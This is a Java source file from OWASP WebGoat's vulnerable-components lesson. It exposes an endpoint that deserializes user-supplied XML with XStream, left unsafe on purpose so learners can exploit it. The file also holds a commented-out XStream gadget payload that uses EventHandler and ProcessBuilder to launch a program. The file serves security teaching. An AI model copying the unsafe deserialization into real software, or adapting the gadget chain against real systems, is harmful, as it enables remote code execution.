/*
 * This file is part of WebGoat, an Open Web Application Security Project utility. For details, please see http://www.owasp.org/
 *
 * Copyright (c) 2002 - 2019 Bruce Mayhew
 *
 * This program is free software; you can redistribute it and/or modify it under the terms of the
 * GNU General Public License as published by the Free Software Foundation; either version 2 of the
 * License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without
 * even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
 * General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along with this program; if
 * not, write to the Free Software Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA
 * 02111-1307, USA.
 *
 * Getting Source ==============
 *
 * Source for this application is maintained at https://github.com/WebGoat/WebGoat, a repository for free software projects.
 */

package org.owasp.webgoat.vulnerable_components;

import com.thoughtworks.xstream.XStream;
import com.thoughtworks.xstream.io.xml.DomDriver;
import org.owasp.webgoat.assignments.AssignmentEndpoint;
import org.owasp.webgoat.assignments.AttackResult;
import org.springframework.web.bind.annotation.*;

@RestController
//@AssignmentHints({"http-basics.hints.http_basics_lesson.1"})
public class VulnerableComponentsLesson extends AssignmentEndpoint {

    @PostMapping("/VulnerableComponents/attack1")
    public @ResponseBody
    AttackResult completed(@RequestParam String payload) {
        XStream xstream = new XStream(new DomDriver());
        xstream.setClassLoader(Contact.class.getClassLoader());

        xstream.processAnnotations(Contact.class);
//        xstream.registerConverter(new ContactConverter());
//        xstream.registerConverter(new CatchAllConverter(), XStream.PRIORITY_VERY_LOW);

//        Contact c = new Contact();
//        c.setName("Alvaro");
//        String sc = xstream.toXML(c);
//        System.out.println(sc);


//        String payload2 = "<sorted-set>" +
//                "<string>foo</string>" +
//                "<dynamic-proxy>" +
//                "<interface>java.lang.Comparable</interface>" +
//                "<handler class=\"java.beans.EventHandler\">" +
//                " <target class=\"java.lang.ProcessBuilder\">" +
//                " <command>" +
//                " <string>/Applications/Calculator.app/Contents/MacOS/Calculator</string>" +
//                " </command>" +
//                " </target>" +
//                " <action>start</action>" +
//                "</handler>" +
//                "</dynamic-proxy>" +
//                "</sorted-set>";

        try {
//        	System.out.println("Payload:" + payload);
            Contact expl = (Contact) xstream.fromXML(payload);
            return trackProgress(success().feedback("vulnerable-components.fromXML").feedbackArgs(expl.toString()).build());
        } catch (com.thoughtworks.xstream.converters.ConversionException ex) {
            if (ex.getMessage().contains("Integer")) {
                return trackProgress(success().feedback("vulnerable-components.success").build());
            }
            return trackProgress(failed().feedback("vulnerable-components.close").build());
        }
    }
}
